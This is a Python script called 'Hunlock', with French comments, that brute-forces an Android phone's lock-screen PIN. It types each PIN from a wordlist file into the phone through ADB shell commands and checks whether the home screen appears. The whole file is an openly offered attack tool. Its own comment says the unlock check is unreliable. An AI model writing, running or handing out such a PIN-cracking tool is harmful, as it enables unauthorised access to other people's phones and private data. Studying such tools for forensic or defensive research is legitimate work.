
from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich import print as rprint
import os
import time

# Initialisation de la console Rich
console = Console()

def display_logo():
    """
    Affiche le nom du script, le hibou en ASCII, et les informations de présentation.
    """
    
    console.print("[bold white on brown]        Hunlock        [/bold white on brown]\n", justify="center")
    
    # Hibou en ASCII
    hibou_ascii = Text('''
        ,     ,
       /(     )\\
      (  \\_/  )
       \\     /
        )===(
       /     \\
      |       |
     /         \\
    /___________\\
    ''', style="yellow")  # Hibou en jaune

    # Informations de présentation
    presentation = Panel.fit(
        f"[bold yellow]Hunlock[/bold yellow]\n"
        f"[bold white]Créateur :[/bold white] [green]Wharkly[/green]\n"
        f"[bold white]GitHub :[/bold white] [blue]https://github.com/nearoofly[/blue]\n"
        f"[bold white]À propos :[/bold white] More tools at [blue]https://github.com/nearoofly[/blue]",
        title="[bold magenta]À propos de Hunlock[/bold magenta]",
        border_style="bold green",
    )

    # Afficher l'art ASCII et le panneau
    console.print(hibou_ascii)
    console.print(presentation)

def read_digits_file(file_path):
    """
    Lit un fichier contenant des codes PIN valides.

    Args:
        file_path (str): Chemin vers le fichier contenant les codes PIN.

    Returns:
        list: Une liste de codes PIN (str).
    """
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        console.print(f"[bold red]Erreur :[/bold red] Le fichier '{file_path}' est introuvable.", style="bold red")
        return []
    except Exception as e:
        console.print(f"[bold red]Une erreur s'est produite :[/bold red] {e}", style="bold red")
        return []

def unlock_phone(pin_codes_file, max_attempts=10000):
    """
    Essaie de déverrouiller un téléphone Android en envoyant des codes PIN via ADB.

    Args:
        pin_codes_file (str): Chemin vers le fichier contenant les codes PIN à tester.
        max_attempts (int): Nombre maximal de tentatives autorisées.

    Returns:
        str: Le code PIN correct si trouvé, sinon un message d'échec.
    """
    if not os.path.exists(pin_codes_file):
        return f"Erreur : Le fichier {pin_codes_file} est introuvable."

    # Lire les codes PIN depuis le fichier
    with open(pin_codes_file, 'r') as file:
        pin_codes = [line.strip() for line in file]

    console.print("[bold cyan]Connexion au téléphone via ADB...[/bold cyan]")
    os.system("adb start-server")

    # Vérifier si un appareil est connecté
    devices = os.popen("adb devices").read().strip()
    if "device" not in devices:
        return "Aucun appareil connecté via ADB. Vérifiez la connexion USB et le mode débogage."

    console.print(f"[bold green]{len(pin_codes)} codes trouvés dans le fichier. Tentative de déblocage...[/bold green]")

    attempts = 0
    for pin in pin_codes:
        if attempts >= max_attempts:
            break
        
        console.print(f"[yellow]Essai du code PIN :[/yellow] [bold]{pin}[/bold]")
        
        # Envoyer le code PIN au téléphone via ADB
        os.system(f"adb shell input text {pin}")
        os.system("adb shell input keyevent 66")  # Appuyer sur "Entrée"

        # Pause pour permettre au téléphone de traiter le code
        time.sleep(1)

        # Ajouter une vérification pour détecter si le téléphone est déverrouillé
        # Cela dépend de l'appareil et du verrouillage en question.
        # Exemple (non fiable) :
        screen_state = os.popen("adb shell dumpsys window | grep mCurrentFocus").read()
        if "Launcher" in screen_state:  # Si le téléphone affiche l'écran d'accueil
            return f"Code PIN correct trouvé : {pin}"

        attempts += 1

    return "Échec : Aucun code PIN valide trouvé dans la liste."

if __name__ == "__main__":
    # Afficher le logo et les informations
    display_logo()
    
    # Chemin du fichier contenant les codes PIN
    fichier_codes = "digits.txt"
    
    # Lancer le processus de déblocage
    resultat = unlock_phone(fichier_codes)
    console.print(resultat, style="bold green" if "trouvé" in resultat else "bold red")
